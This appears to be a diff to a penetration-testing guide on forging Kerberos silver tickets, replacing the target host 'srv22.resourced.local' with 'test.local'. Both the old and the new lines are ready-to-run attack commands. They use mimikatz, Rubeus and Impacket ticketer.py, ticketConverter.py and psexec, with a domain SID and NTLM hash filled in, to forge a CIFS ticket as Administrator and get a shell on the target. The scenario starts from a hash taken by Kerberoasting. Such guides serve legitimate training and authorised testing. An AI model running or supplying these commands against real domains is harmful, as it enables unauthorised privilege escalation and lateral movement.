@@ -48,13 +48,13 @@ whoami /user
 # Output SID: S-1-5-21-3623811015-3361044348-30300820-1001
 
 # Create Silver Ticket for CIFS (SMB) on SRV22 as Administrator
-mimikatz.exe "kerberos::golden /domain:resourced.local /sid:S-1-5-21-3623811015-3361044348-30300820 /target:srv22.resourced.local /service:cifs /rc4:19a3a7550ce8c505c2d46b5e39d6f808 /user:Administrator /ptt" exit
+mimikatz.exe "kerberos::golden /domain:resourced.local /sid:S-1-5-21-3623811015-3361044348-30300820 /target:test.local /service:cifs /rc4:19a3a7550ce8c505c2d46b5e39d6f808 /user:Administrator /ptt" exit
 
 # Verify the ticket injection
 klist
 
 # Access target host file share
-dir \\srv22.resourced.local\C$
+dir \\test.local\C$
 ```
 
 ### Method 2: Rubeus (Windows - Alternative)
@@ -63,7 +63,7 @@ dir \\srv22.resourced.local\C$
 Rubeus.exe silver /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_HOST> /service:<SERVICE> /rc4:<NTLM_HASH> /user:<USER> /ptt
 
 # Example:
-Rubeus.exe silver /domain:resourced.local /sid:S-1-5-21-3623811015-3361044348-30300820 /target:srv22.resourced.local /service:cifs /rc4:19a3a7550ce8c505c2d46b5e39d6f808 /user:Administrator /ptt
+Rubeus.exe silver /domain:resourced.local /sid:S-1-5-21-3623811015-3361044348-30300820 /target:test.local /service:cifs /rc4:19a3a7550ce8c505c2d46b5e39d6f808 /user:Administrator /ptt
 ```
 
 ### Method 3: Impacket `ticketer.py` (Linux)
@@ -72,13 +72,13 @@ Rubeus.exe silver /domain:resourced.local /sid:S-1-5-21-3623811015-3361044348-30
 ticketer.py -domain <DOMAIN> -domain-sid <DOMAIN_SID> -nthash <NTLM_HASH> -spn <SERVICE>/<TARGET_HOST> <USER>
 
 # Generate the ticket cache file
-ticketer.py -domain resourced.local -domain-sid S-1-5-21-3623811015-3361044348-30300820 -nthash 19a3a7550ce8c505c2d46b5e39d6f808 -spn cifs/srv22.resourced.local Administrator
+ticketer.py -domain resourced.local -domain-sid S-1-5-21-3623811015-3361044348-30300820 -nthash 19a3a7550ce8c505c2d46b5e39d6f808 -spn cifs/test.local Administrator
 
 # Set the environment variable to use the ticket
 export KRB5CCNAME=$(pwd)/Administrator.ccache
 
 # Authenticate using Kerberos authentication without a password
-impacket-psexec resourced/Administrator@srv22.resourced.local -k -no-pass
+impacket-psexec resourced/Administrator@test.local -k -no-pass
 ```
 
 ### Method 4: Impacket `ticketConverter.py` (Linux - Convert Tickets)
@@ -90,7 +90,7 @@ ticketConverter.py ticket.kirbi ticket.ccache
 
 # Load and execute via Kerberos
 export KRB5CCNAME=$(pwd)/ticket.ccache
-impacket-psexec resourced/Administrator@srv22.resourced.local -k -no-pass
+impacket-psexec resourced/Administrator@test.local -k -no-pass
 ```
 
 # Services You Can Target
@@ -109,7 +109,7 @@ impacket-psexec resourced/Administrator@srv22.resourced.local -k -no-pass
 
 # Practical Example Scenario
 
-**Context:** You have recovered the **svc_mssql** account hash from a Kerberoasting attack and need to target the server **SRV22**.
+**Context:** You have recovered the **svc_mssql** account hash from a Kerberoasting attack and need to target the server **test.local**.
 
 ---
 
